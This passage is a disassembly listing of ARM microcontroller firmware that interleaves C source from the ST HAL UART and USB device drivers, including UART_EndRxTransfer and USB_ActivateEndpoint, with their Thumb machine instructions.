 8005d06:	621a      	str	r2, [r3, #32]

          /* Blocking error : transfer is aborted
          Set the UART state ready to be able to start again the process,
          Disable Rx Interrupts if ongoing */
          UART_EndRxTransfer(huart);
 8005d08:	68f8      	ldr	r0, [r7, #12]
 8005d0a:	f000 f81e 	bl	8005d4a <UART_EndRxTransfer>

          huart->ErrorCode = HAL_UART_ERROR_RTO;
 8005d0e:	68fb      	ldr	r3, [r7, #12]
 8005d10:	2220      	movs	r2, #32
 8005d12:	f8c3 2084 	str.w	r2, [r3, #132]	; 0x84

          /* Process Unlocked */
          __HAL_UNLOCK(huart);
 8005d16:	68fb      	ldr	r3, [r7, #12]
 8005d18:	2200      	movs	r2, #0
 8005d1a:	f883 2078 	strb.w	r2, [r3, #120]	; 0x78

          return HAL_TIMEOUT;
 8005d1e:	2303      	movs	r3, #3
 8005d20:	e00f      	b.n	8005d42 <UART_WaitOnFlagUntilTimeout+0xc6>
  while ((__HAL_UART_GET_FLAG(huart, Flag) ? SET : RESET) == Status)
 8005d22:	68fb      	ldr	r3, [r7, #12]
 8005d24:	681b      	ldr	r3, [r3, #0]
 8005d26:	69da      	ldr	r2, [r3, #28]
 8005d28:	68bb      	ldr	r3, [r7, #8]
 8005d2a:	4013      	ands	r3, r2
 8005d2c:	68ba      	ldr	r2, [r7, #8]
 8005d2e:	429a      	cmp	r2, r3
 8005d30:	bf0c      	ite	eq
 8005d32:	2301      	moveq	r3, #1
 8005d34:	2300      	movne	r3, #0
 8005d36:	b2db      	uxtb	r3, r3
 8005d38:	461a      	mov	r2, r3
 8005d3a:	79fb      	ldrb	r3, [r7, #7]
 8005d3c:	429a      	cmp	r2, r3
 8005d3e:	d0a6      	beq.n	8005c8e <UART_WaitOnFlagUntilTimeout+0x12>
        }
      }
    }
  }
  return HAL_OK;
 8005d40:	2300      	movs	r3, #0
}
 8005d42:	4618      	mov	r0, r3
 8005d44:	3710      	adds	r7, #16
 8005d46:	46bd      	mov	sp, r7
 8005d48:	bd80      	pop	{r7, pc}

08005d4a <UART_EndRxTransfer>:
  * @brief  End ongoing Rx transfer on UART peripheral (following error detection or Reception completion).
  * @param  huart UART handle.
  * @retval None
  */
static void UART_EndRxTransfer(UART_HandleTypeDef *huart)
{
 8005d4a:	b480      	push	{r7}
 8005d4c:	b095      	sub	sp, #84	; 0x54
 8005d4e:	af00      	add	r7, sp, #0
 8005d50:	6078      	str	r0, [r7, #4]
  /* Disable RXNE, PE and ERR (Frame error, noise error, overrun error) interrupts */
#if defined(USART_CR1_FIFOEN)
  ATOMIC_CLEAR_BIT(huart->Instance->CR1, (USART_CR1_RXNEIE_RXFNEIE | USART_CR1_PEIE));
  ATOMIC_CLEAR_BIT(huart->Instance->CR3, (USART_CR3_EIE | USART_CR3_RXFTIE));
#else
  ATOMIC_CLEAR_BIT(huart->Instance->CR1, (USART_CR1_RXNEIE | USART_CR1_PEIE));
 8005d52:	687b      	ldr	r3, [r7, #4]
 8005d54:	681b      	ldr	r3, [r3, #0]
 8005d56:	637b      	str	r3, [r7, #52]	; 0x34
   __ASM volatile ("ldrex %0, %1" : "=r" (result) : "Q" (*addr) );
 8005d58:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8005d5a:	e853 3f00 	ldrex	r3, [r3]
 8005d5e:	633b      	str	r3, [r7, #48]	; 0x30
   return(result);
 8005d60:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8005d62:	f423 7390 	bic.w	r3, r3, #288	; 0x120
 8005d66:	64fb      	str	r3, [r7, #76]	; 0x4c
 8005d68:	687b      	ldr	r3, [r7, #4]
 8005d6a:	681b      	ldr	r3, [r3, #0]
 8005d6c:	461a      	mov	r2, r3
 8005d6e:	6cfb      	ldr	r3, [r7, #76]	; 0x4c
 8005d70:	643b      	str	r3, [r7, #64]	; 0x40
 8005d72:	63fa      	str	r2, [r7, #60]	; 0x3c
   __ASM volatile ("strex %0, %2, %1" : "=&r" (result), "=Q" (*addr) : "r" (value) );
 8005d74:	6bf9      	ldr	r1, [r7, #60]	; 0x3c
 8005d76:	6c3a      	ldr	r2, [r7, #64]	; 0x40
 8005d78:	e841 2300 	strex	r3, r2, [r1]
 8005d7c:	63bb      	str	r3, [r7, #56]	; 0x38
   return(result);
 8005d7e:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8005d80:	2b00      	cmp	r3, #0
 8005d82:	d1e6      	bne.n	8005d52 <UART_EndRxTransfer+0x8>
  ATOMIC_CLEAR_BIT(huart->Instance->CR3, USART_CR3_EIE);
 8005d84:	687b      	ldr	r3, [r7, #4]
 8005d86:	681b      	ldr	r3, [r3, #0]
 8005d88:	3308      	adds	r3, #8
 8005d8a:	623b      	str	r3, [r7, #32]
   __ASM volatile ("ldrex %0, %1" : "=r" (result) : "Q" (*addr) );
 8005d8c:	6a3b      	ldr	r3, [r7, #32]
 8005d8e:	e853 3f00 	ldrex	r3, [r3]
 8005d92:	61fb      	str	r3, [r7, #28]
   return(result);
 8005d94:	69fb      	ldr	r3, [r7, #28]
 8005d96:	f023 0301 	bic.w	r3, r3, #1
 8005d9a:	64bb      	str	r3, [r7, #72]	; 0x48
 8005d9c:	687b      	ldr	r3, [r7, #4]
 8005d9e:	681b      	ldr	r3, [r3, #0]
 8005da0:	3308      	adds	r3, #8
 8005da2:	6cba      	ldr	r2, [r7, #72]	; 0x48
 8005da4:	62fa      	str	r2, [r7, #44]	; 0x2c
 8005da6:	62bb      	str	r3, [r7, #40]	; 0x28
   __ASM volatile ("strex %0, %2, %1" : "=&r" (result), "=Q" (*addr) : "r" (value) );
 8005da8:	6ab9      	ldr	r1, [r7, #40]	; 0x28
 8005daa:	6afa      	ldr	r2, [r7, #44]	; 0x2c
 8005dac:	e841 2300 	strex	r3, r2, [r1]
 8005db0:	627b      	str	r3, [r7, #36]	; 0x24
   return(result);
 8005db2:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8005db4:	2b00      	cmp	r3, #0
 8005db6:	d1e5      	bne.n	8005d84 <UART_EndRxTransfer+0x3a>
#endif /* USART_CR1_FIFOEN */

  /* In case of reception waiting for IDLE event, disable also the IDLE IE interrupt source */
  if (huart->ReceptionType == HAL_UART_RECEPTION_TOIDLE)
 8005db8:	687b      	ldr	r3, [r7, #4]
 8005dba:	6e1b      	ldr	r3, [r3, #96]	; 0x60
 8005dbc:	2b01      	cmp	r3, #1
 8005dbe:	d118      	bne.n	8005df2 <UART_EndRxTransfer+0xa8>
  {
    ATOMIC_CLEAR_BIT(huart->Instance->CR1, USART_CR1_IDLEIE);
 8005dc0:	687b      	ldr	r3, [r7, #4]
 8005dc2:	681b      	ldr	r3, [r3, #0]
 8005dc4:	60fb      	str	r3, [r7, #12]
   __ASM volatile ("ldrex %0, %1" : "=r" (result) : "Q" (*addr) );
 8005dc6:	68fb      	ldr	r3, [r7, #12]
 8005dc8:	e853 3f00 	ldrex	r3, [r3]
 8005dcc:	60bb      	str	r3, [r7, #8]
   return(result);
 8005dce:	68bb      	ldr	r3, [r7, #8]
 8005dd0:	f023 0310 	bic.w	r3, r3, #16
 8005dd4:	647b      	str	r3, [r7, #68]	; 0x44
 8005dd6:	687b      	ldr	r3, [r7, #4]
 8005dd8:	681b      	ldr	r3, [r3, #0]
 8005dda:	461a      	mov	r2, r3
 8005ddc:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8005dde:	61bb      	str	r3, [r7, #24]
 8005de0:	617a      	str	r2, [r7, #20]
   __ASM volatile ("strex %0, %2, %1" : "=&r" (result), "=Q" (*addr) : "r" (value) );
 8005de2:	6979      	ldr	r1, [r7, #20]
 8005de4:	69ba      	ldr	r2, [r7, #24]
 8005de6:	e841 2300 	strex	r3, r2, [r1]
 8005dea:	613b      	str	r3, [r7, #16]
   return(result);
 8005dec:	693b      	ldr	r3, [r7, #16]
 8005dee:	2b00      	cmp	r3, #0
 8005df0:	d1e6      	bne.n	8005dc0 <UART_EndRxTransfer+0x76>
  }

  /* At end of Rx process, restore huart->RxState to Ready */
  huart->RxState = HAL_UART_STATE_READY;
 8005df2:	687b      	ldr	r3, [r7, #4]
 8005df4:	2220      	movs	r2, #32
 8005df6:	f8c3 2080 	str.w	r2, [r3, #128]	; 0x80
  huart->ReceptionType = HAL_UART_RECEPTION_STANDARD;
 8005dfa:	687b      	ldr	r3, [r7, #4]
 8005dfc:	2200      	movs	r2, #0
 8005dfe:	661a      	str	r2, [r3, #96]	; 0x60

  /* Reset RxIsr function pointer */
  huart->RxISR = NULL;
 8005e00:	687b      	ldr	r3, [r7, #4]
 8005e02:	2200      	movs	r2, #0
 8005e04:	669a      	str	r2, [r3, #104]	; 0x68
}
 8005e06:	bf00      	nop
 8005e08:	3754      	adds	r7, #84	; 0x54
 8005e0a:	46bd      	mov	sp, r7
 8005e0c:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005e10:	4770      	bx	lr

08005e12 <USB_CoreInit>:
  * @param  cfg pointer to a USB_CfgTypeDef structure that contains
  *         the configuration information for the specified USBx peripheral.
  * @retval HAL status
  */
HAL_StatusTypeDef USB_CoreInit(USB_TypeDef *USBx, USB_CfgTypeDef cfg)
{
 8005e12:	b084      	sub	sp, #16
 8005e14:	b480      	push	{r7}
 8005e16:	b083      	sub	sp, #12
 8005e18:	af00      	add	r7, sp, #0
 8005e1a:	6078      	str	r0, [r7, #4]
 8005e1c:	f107 0014 	add.w	r0, r7, #20
 8005e20:	e880 000e 	stmia.w	r0, {r1, r2, r3}
  /* NOTE : - This function is not required by USB Device FS peripheral, it is used
              only by USB OTG FS peripheral.
            - This function is added to ensure compatibility across platforms.
   */

  return HAL_OK;
 8005e24:	2300      	movs	r3, #0
}
 8005e26:	4618      	mov	r0, r3
 8005e28:	370c      	adds	r7, #12
 8005e2a:	46bd      	mov	sp, r7
 8005e2c:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005e30:	b004      	add	sp, #16
 8005e32:	4770      	bx	lr

08005e34 <USB_EnableGlobalInt>:
  *         Enables the controller's Global Int in the AHB Config reg
  * @param  USBx Selected device
  * @retval HAL status
  */
HAL_StatusTypeDef USB_EnableGlobalInt(USB_TypeDef *USBx)
{
 8005e34:	b480      	push	{r7}
 8005e36:	b085      	sub	sp, #20
 8005e38:	af00      	add	r7, sp, #0
 8005e3a:	6078      	str	r0, [r7, #4]
  uint32_t winterruptmask;

  /* Clear pending interrupts */
  USBx->ISTR = 0U;
 8005e3c:	687b      	ldr	r3, [r7, #4]
 8005e3e:	2200      	movs	r2, #0
 8005e40:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

  /* Set winterruptmask variable */
  winterruptmask = USB_CNTR_CTRM  | USB_CNTR_WKUPM |
 8005e44:	f64b 7380 	movw	r3, #49024	; 0xbf80
 8005e48:	60fb      	str	r3, [r7, #12]
                   USB_CNTR_SUSPM | USB_CNTR_ERRM |
                   USB_CNTR_SOFM | USB_CNTR_ESOFM |
                   USB_CNTR_RESETM | USB_CNTR_L1REQM;

  /* Set interrupt mask */
  USBx->CNTR = (uint16_t)winterruptmask;
 8005e4a:	68fb      	ldr	r3, [r7, #12]
 8005e4c:	b29a      	uxth	r2, r3
 8005e4e:	687b      	ldr	r3, [r7, #4]
 8005e50:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

  return HAL_OK;
 8005e54:	2300      	movs	r3, #0
}
 8005e56:	4618      	mov	r0, r3
 8005e58:	3714      	adds	r7, #20
 8005e5a:	46bd      	mov	sp, r7
 8005e5c:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005e60:	4770      	bx	lr

08005e62 <USB_DisableGlobalInt>:
  *         Disable the controller's Global Int in the AHB Config reg
  * @param  USBx Selected device
  * @retval HAL status
  */
HAL_StatusTypeDef USB_DisableGlobalInt(USB_TypeDef *USBx)
{
 8005e62:	b480      	push	{r7}
 8005e64:	b085      	sub	sp, #20
 8005e66:	af00      	add	r7, sp, #0
 8005e68:	6078      	str	r0, [r7, #4]
  uint32_t winterruptmask;

  /* Set winterruptmask variable */
  winterruptmask = USB_CNTR_CTRM  | USB_CNTR_WKUPM |
 8005e6a:	f64b 7380 	movw	r3, #49024	; 0xbf80
 8005e6e:	60fb      	str	r3, [r7, #12]
                   USB_CNTR_SUSPM | USB_CNTR_ERRM |
                   USB_CNTR_SOFM | USB_CNTR_ESOFM |
                   USB_CNTR_RESETM | USB_CNTR_L1REQM;

  /* Clear interrupt mask */
  USBx->CNTR &= (uint16_t)(~winterruptmask);
 8005e70:	687b      	ldr	r3, [r7, #4]
 8005e72:	f8b3 3040 	ldrh.w	r3, [r3, #64]	; 0x40
 8005e76:	b29a      	uxth	r2, r3
 8005e78:	68fb      	ldr	r3, [r7, #12]
 8005e7a:	b29b      	uxth	r3, r3
 8005e7c:	43db      	mvns	r3, r3
 8005e7e:	b29b      	uxth	r3, r3
 8005e80:	4013      	ands	r3, r2
 8005e82:	b29a      	uxth	r2, r3
 8005e84:	687b      	ldr	r3, [r7, #4]
 8005e86:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

  return HAL_OK;
 8005e8a:	2300      	movs	r3, #0
}
 8005e8c:	4618      	mov	r0, r3
 8005e8e:	3714      	adds	r7, #20
 8005e90:	46bd      	mov	sp, r7
 8005e92:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005e96:	4770      	bx	lr

08005e98 <USB_SetCurrentMode>:
  *          This parameter can be one of the these values:
  *            @arg USB_DEVICE_MODE Peripheral mode
  * @retval HAL status
  */
HAL_StatusTypeDef USB_SetCurrentMode(USB_TypeDef *USBx, USB_ModeTypeDef mode)
{
 8005e98:	b480      	push	{r7}
 8005e9a:	b083      	sub	sp, #12
 8005e9c:	af00      	add	r7, sp, #0
 8005e9e:	6078      	str	r0, [r7, #4]
 8005ea0:	460b      	mov	r3, r1
 8005ea2:	70fb      	strb	r3, [r7, #3]

  /* NOTE : - This function is not required by USB Device FS peripheral, it is used
              only by USB OTG FS peripheral.
            - This function is added to ensure compatibility across platforms.
   */
  return HAL_OK;
 8005ea4:	2300      	movs	r3, #0
}
 8005ea6:	4618      	mov	r0, r3
 8005ea8:	370c      	adds	r7, #12
 8005eaa:	46bd      	mov	sp, r7
 8005eac:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005eb0:	4770      	bx	lr

08005eb2 <USB_DevInit>:
  * @param  cfg  pointer to a USB_CfgTypeDef structure that contains
  *         the configuration information for the specified USBx peripheral.
  * @retval HAL status
  */
HAL_StatusTypeDef USB_DevInit(USB_TypeDef *USBx, USB_CfgTypeDef cfg)
{
 8005eb2:	b084      	sub	sp, #16
 8005eb4:	b480      	push	{r7}
 8005eb6:	b083      	sub	sp, #12
 8005eb8:	af00      	add	r7, sp, #0
 8005eba:	6078      	str	r0, [r7, #4]
 8005ebc:	f107 0014 	add.w	r0, r7, #20
 8005ec0:	e880 000e 	stmia.w	r0, {r1, r2, r3}
  /* Prevent unused argument(s) compilation warning */
  UNUSED(cfg);

  /* Init Device */
  /* CNTR_FRES = 1 */
  USBx->CNTR = (uint16_t)USB_CNTR_FRES;
 8005ec4:	687b      	ldr	r3, [r7, #4]
 8005ec6:	2201      	movs	r2, #1
 8005ec8:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

  /* CNTR_FRES = 0 */
  USBx->CNTR = 0U;
 8005ecc:	687b      	ldr	r3, [r7, #4]
 8005ece:	2200      	movs	r2, #0
 8005ed0:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

  /* Clear pending interrupts */
  USBx->ISTR = 0U;
 8005ed4:	687b      	ldr	r3, [r7, #4]
 8005ed6:	2200      	movs	r2, #0
 8005ed8:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

  /*Set Btable Address*/
  USBx->BTABLE = BTABLE_ADDRESS;
 8005edc:	687b      	ldr	r3, [r7, #4]
 8005ede:	2200      	movs	r2, #0
 8005ee0:	f8a3 2050 	strh.w	r2, [r3, #80]	; 0x50

  return HAL_OK;
 8005ee4:	2300      	movs	r3, #0
}
 8005ee6:	4618      	mov	r0, r3
 8005ee8:	370c      	adds	r7, #12
 8005eea:	46bd      	mov	sp, r7
 8005eec:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005ef0:	b004      	add	sp, #16
 8005ef2:	4770      	bx	lr

08005ef4 <USB_FlushTxFifo>:
  *         This parameter can be a value from 1 to 15
            15 means Flush all Tx FIFOs
  * @retval HAL status
  */
HAL_StatusTypeDef USB_FlushTxFifo(USB_TypeDef const *USBx, uint32_t num)
{
 8005ef4:	b480      	push	{r7}
 8005ef6:	b083      	sub	sp, #12
 8005ef8:	af00      	add	r7, sp, #0
 8005efa:	6078      	str	r0, [r7, #4]
 8005efc:	6039      	str	r1, [r7, #0]
  /* NOTE : - This function is not required by USB Device FS peripheral, it is used
              only by USB OTG FS peripheral.
            - This function is added to ensure compatibility across platforms.
   */

  return HAL_OK;
 8005efe:	2300      	movs	r3, #0
}
 8005f00:	4618      	mov	r0, r3
 8005f02:	370c      	adds	r7, #12
 8005f04:	46bd      	mov	sp, r7
 8005f06:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005f0a:	4770      	bx	lr

08005f0c <USB_FlushRxFifo>:
  * @brief  USB_FlushRxFifo : Flush Rx FIFO
  * @param  USBx : Selected device
  * @retval HAL status
  */
HAL_StatusTypeDef USB_FlushRxFifo(USB_TypeDef const *USBx)
{
 8005f0c:	b480      	push	{r7}
 8005f0e:	b083      	sub	sp, #12
 8005f10:	af00      	add	r7, sp, #0
 8005f12:	6078      	str	r0, [r7, #4]
  /* NOTE : - This function is not required by USB Device FS peripheral, it is used
              only by USB OTG FS peripheral.
            - This function is added to ensure compatibility across platforms.
   */

  return HAL_OK;
 8005f14:	2300      	movs	r3, #0
}
 8005f16:	4618      	mov	r0, r3
 8005f18:	370c      	adds	r7, #12
 8005f1a:	46bd      	mov	sp, r7
 8005f1c:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005f20:	4770      	bx	lr
	...

08005f24 <USB_ActivateEndpoint>:
  * @param  USBx Selected device
  * @param  ep pointer to endpoint structure
  * @retval HAL status
  */
HAL_StatusTypeDef USB_ActivateEndpoint(USB_TypeDef *USBx, USB_EPTypeDef *ep)
{
 8005f24:	b480      	push	{r7}
 8005f26:	b09d      	sub	sp, #116	; 0x74
 8005f28:	af00      	add	r7, sp, #0
 8005f2a:	6078      	str	r0, [r7, #4]
 8005f2c:	6039      	str	r1, [r7, #0]
  HAL_StatusTypeDef ret = HAL_OK;
 8005f2e:	2300      	movs	r3, #0
 8005f30:	f887 306f 	strb.w	r3, [r7, #111]	; 0x6f
  uint16_t wEpRegVal;

  wEpRegVal = PCD_GET_ENDPOINT(USBx, ep->num) & USB_EP_T_MASK;
 8005f34:	687a      	ldr	r2, [r7, #4]
 8005f36:	683b      	ldr	r3, [r7, #0]
 8005f38:	781b      	ldrb	r3, [r3, #0]
 8005f3a:	009b      	lsls	r3, r3, #2
 8005f3c:	4413      	add	r3, r2
 8005f3e:	881b      	ldrh	r3, [r3, #0]
 8005f40:	b29b      	uxth	r3, r3
 8005f42:	f423 43ec 	bic.w	r3, r3, #30208	; 0x7600
 8005f46:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8005f4a:	f8a7 306c 	strh.w	r3, [r7, #108]	; 0x6c

  /* initialize Endpoint */
  switch (ep->type)
 8005f4e:	683b      	ldr	r3, [r7, #0]
 8005f50:	78db      	ldrb	r3, [r3, #3]
 8005f52:	2b03      	cmp	r3, #3
 8005f54:	d81f      	bhi.n	8005f96 <USB_ActivateEndpoint+0x72>
 8005f56:	a201      	add	r2, pc, #4	; (adr r2, 8005f5c <USB_ActivateEndpoint+0x38>)
 8005f58:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 8005f5c:	08005f6d 	.word	0x08005f6d
 8005f60:	08005f89 	.word	0x08005f89
 8005f64:	08005f9f 	.word	0x08005f9f
 8005f68:	08005f7b 	.word	0x08005f7b
  {
    case EP_TYPE_CTRL:
      wEpRegVal |= USB_EP_CONTROL;
 8005f6c:	f8b7 306c 	ldrh.w	r3, [r7, #108]	; 0x6c
 8005f70:	f443 7300 	orr.w	r3, r3, #512	; 0x200
 8005f74:	f8a7 306c 	strh.w	r3, [r7, #108]	; 0x6c
      break;
 8005f78:	e012      	b.n	8005fa0 <USB_ActivateEndpoint+0x7c>
    case EP_TYPE_BULK:
      wEpRegVal |= USB_EP_BULK;
      break;

    case EP_TYPE_INTR:
      wEpRegVal |= USB_EP_INTERRUPT;
 8005f7a:	f8b7 306c 	ldrh.w	r3, [r7, #108]	; 0x6c
 8005f7e:	f443 63c0 	orr.w	r3, r3, #1536	; 0x600
 8005f82:	f8a7 306c 	strh.w	r3, [r7, #108]	; 0x6c
      break;
 8005f86:	e00b      	b.n	8005fa0 <USB_ActivateEndpoint+0x7c>

    case EP_TYPE_ISOC:
      wEpRegVal |= USB_EP_ISOCHRONOUS;
 8005f88:	f8b7 306c 	ldrh.w	r3, [r7, #108]	; 0x6c
 8005f8c:	f443 6380 	orr.w	r3, r3, #1024	; 0x400
 8005f90:	f8a7 306c 	strh.w	r3, [r7, #108]	; 0x6c
      break;
 8005f94:	e004      	b.n	8005fa0 <USB_ActivateEndpoint+0x7c>

    default:
      ret = HAL_ERROR;
 8005f96:	2301      	movs	r3, #1
 8005f98:	f887 306f 	strb.w	r3, [r7, #111]	; 0x6f
      break;
 8005f9c:	e000      	b.n	8005fa0 <USB_ActivateEndpoint+0x7c>
      break;
 8005f9e:	bf00      	nop
  }

  PCD_SET_ENDPOINT(USBx, ep->num, (wEpRegVal | USB_EP_CTR_RX | USB_EP_CTR_TX));
 8005fa0:	687a      	ldr	r2, [r7, #4]
 8005fa2:	683b      	ldr	r3, [r7, #0]
 8005fa4:	781b      	ldrb	r3, [r3, #0]
 8005fa6:	009b      	lsls	r3, r3, #2
 8005fa8:	441a      	add	r2, r3
 8005faa:	f8b7 306c 	ldrh.w	r3, [r7, #108]	; 0x6c
 8005fae:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8005fb2:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8005fb6:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8005fba:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8005fbe:	b29b      	uxth	r3, r3
 8005fc0:	8013      	strh	r3, [r2, #0]

  PCD_SET_EP_ADDRESS(USBx, ep->num, ep->num);
 8005fc2:	687a      	ldr	r2, [r7, #4]
 8005fc4:	683b      	ldr	r3, [r7, #0]
 8005fc6:	781b      	ldrb	r3, [r3, #0]
 8005fc8:	009b      	lsls	r3, r3, #2
 8005fca:	4413      	add	r3, r2
 8005fcc:	881b      	ldrh	r3, [r3, #0]
 8005fce:	b29b      	uxth	r3, r3
 8005fd0:	b21b      	sxth	r3, r3
 8005fd2:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8005fd6:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8005fda:	b21a      	sxth	r2, r3
 8005fdc:	683b      	ldr	r3, [r7, #0]
 8005fde:	781b      	ldrb	r3, [r3, #0]
 8005fe0:	b21b      	sxth	r3, r3
 8005fe2:	4313      	orrs	r3, r2
 8005fe4:	b21b      	sxth	r3, r3
 8005fe6:	f8a7 3066 	strh.w	r3, [r7, #102]	; 0x66
 8005fea:	687a      	ldr	r2, [r7, #4]
 8005fec:	683b      	ldr	r3, [r7, #0]
 8005fee:	781b      	ldrb	r3, [r3, #0]
 8005ff0:	009b      	lsls	r3, r3, #2
 8005ff2:	441a      	add	r2, r3
 8005ff4:	f8b7 3066 	ldrh.w	r3, [r7, #102]	; 0x66
 8005ff8:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8005ffc:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006000:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006004:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006008:	b29b      	uxth	r3, r3
 800600a:	8013      	strh	r3, [r2, #0]

  if (ep->doublebuffer == 0U)
 800600c:	683b      	ldr	r3, [r7, #0]
 800600e:	7b1b      	ldrb	r3, [r3, #12]
 8006010:	2b00      	cmp	r3, #0
 8006012:	f040 8178 	bne.w	8006306 <USB_ActivateEndpoint+0x3e2>
  {
    if (ep->is_in != 0U)
 8006016:	683b      	ldr	r3, [r7, #0]
 8006018:	785b      	ldrb	r3, [r3, #1]
 800601a:	2b00      	cmp	r3, #0
 800601c:	f000 8084 	beq.w	8006128 <USB_ActivateEndpoint+0x204>
    {
      /*Set the endpoint Transmit buffer address */
      PCD_SET_EP_TX_ADDRESS(USBx, ep->num, ep->pmaadress);
 8006020:	687b      	ldr	r3, [r7, #4]
 8006022:	61bb      	str	r3, [r7, #24]
 8006024:	687b      	ldr	r3, [r7, #4]
 8006026:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800602a:	b29b      	uxth	r3, r3
 800602c:	461a      	mov	r2, r3
 800602e:	69bb      	ldr	r3, [r7, #24]
 8006030:	4413      	add	r3, r2
 8006032:	61bb      	str	r3, [r7, #24]
 8006034:	683b      	ldr	r3, [r7, #0]
 8006036:	781b      	ldrb	r3, [r3, #0]
 8006038:	00da      	lsls	r2, r3, #3
 800603a:	69bb      	ldr	r3, [r7, #24]
 800603c:	4413      	add	r3, r2
 800603e:	f503 6380 	add.w	r3, r3, #1024	; 0x400
 8006042:	617b      	str	r3, [r7, #20]
 8006044:	683b      	ldr	r3, [r7, #0]
 8006046:	88db      	ldrh	r3, [r3, #6]
 8006048:	085b      	lsrs	r3, r3, #1
 800604a:	b29b      	uxth	r3, r3
 800604c:	005b      	lsls	r3, r3, #1
 800604e:	b29a      	uxth	r2, r3
 8006050:	697b      	ldr	r3, [r7, #20]
 8006052:	801a      	strh	r2, [r3, #0]
      PCD_CLEAR_TX_DTOG(USBx, ep->num);
 8006054:	687a      	ldr	r2, [r7, #4]
 8006056:	683b      	ldr	r3, [r7, #0]
 8006058:	781b      	ldrb	r3, [r3, #0]
 800605a:	009b      	lsls	r3, r3, #2
 800605c:	4413      	add	r3, r2
 800605e:	881b      	ldrh	r3, [r3, #0]
 8006060:	827b      	strh	r3, [r7, #18]
 8006062:	8a7b      	ldrh	r3, [r7, #18]
 8006064:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8006068:	2b00      	cmp	r3, #0
 800606a:	d01b      	beq.n	80060a4 <USB_ActivateEndpoint+0x180>
 800606c:	687a      	ldr	r2, [r7, #4]
 800606e:	683b      	ldr	r3, [r7, #0]
 8006070:	781b      	ldrb	r3, [r3, #0]
 8006072:	009b      	lsls	r3, r3, #2
 8006074:	4413      	add	r3, r2
 8006076:	881b      	ldrh	r3, [r3, #0]
 8006078:	b29b      	uxth	r3, r3
 800607a:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800607e:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006082:	823b      	strh	r3, [r7, #16]
 8006084:	687a      	ldr	r2, [r7, #4]
 8006086:	683b      	ldr	r3, [r7, #0]
 8006088:	781b      	ldrb	r3, [r3, #0]
 800608a:	009b      	lsls	r3, r3, #2
 800608c:	441a      	add	r2, r3
 800608e:	8a3b      	ldrh	r3, [r7, #16]
 8006090:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006094:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006098:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800609c:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 80060a0:	b29b      	uxth	r3, r3
 80060a2:	8013      	strh	r3, [r2, #0]

      if (ep->type != EP_TYPE_ISOC)
 80060a4:	683b      	ldr	r3, [r7, #0]
 80060a6:	78db      	ldrb	r3, [r3, #3]
 80060a8:	2b01      	cmp	r3, #1
 80060aa:	d020      	beq.n	80060ee <USB_ActivateEndpoint+0x1ca>
      {
        /* Configure NAK status for the Endpoint */
        PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_NAK);
 80060ac:	687a      	ldr	r2, [r7, #4]
 80060ae:	683b      	ldr	r3, [r7, #0]
 80060b0:	781b      	ldrb	r3, [r3, #0]
 80060b2:	009b      	lsls	r3, r3, #2
 80060b4:	4413      	add	r3, r2
 80060b6:	881b      	ldrh	r3, [r3, #0]
 80060b8:	b29b      	uxth	r3, r3
 80060ba:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80060be:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 80060c2:	81bb      	strh	r3, [r7, #12]
 80060c4:	89bb      	ldrh	r3, [r7, #12]
 80060c6:	f083 0320 	eor.w	r3, r3, #32
 80060ca:	81bb      	strh	r3, [r7, #12]
 80060cc:	687a      	ldr	r2, [r7, #4]
 80060ce:	683b      	ldr	r3, [r7, #0]
 80060d0:	781b      	ldrb	r3, [r3, #0]
 80060d2:	009b      	lsls	r3, r3, #2
 80060d4:	441a      	add	r2, r3
 80060d6:	89bb      	ldrh	r3, [r7, #12]
 80060d8:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80060dc:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80060e0:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80060e4:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80060e8:	b29b      	uxth	r3, r3
 80060ea:	8013      	strh	r3, [r2, #0]
 80060ec:	e2d5      	b.n	800669a <USB_ActivateEndpoint+0x776>
      }
      else
      {
        /* Configure TX Endpoint to disabled state */
        PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_DIS);
 80060ee:	687a      	ldr	r2, [r7, #4]
